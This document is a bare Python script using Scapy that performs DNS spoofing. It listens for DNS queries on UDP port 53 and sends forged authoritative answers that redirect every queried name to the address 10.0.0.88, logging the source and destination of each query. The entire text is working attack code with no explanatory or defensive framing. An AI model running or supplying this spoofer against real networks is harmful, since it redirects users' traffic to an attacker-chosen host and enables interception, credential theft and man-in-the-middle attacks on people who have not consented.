from scapy.all import *
def dns_spoof(packet): 
  if packet.haslayer(DNS) and packet[DNS].qr == 0: # DNS query 
     spoofed_response = IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata="10.0.0.88")) 
     print(packet[IP].src) 
     print(packet[IP].dst) 
    #Sniff DNS queries and apply the DNS spoofing function 
     send(spoofed_response, verbose=0) 
sniff(filter="udp port 53", prn=dns_spoof, store=0)
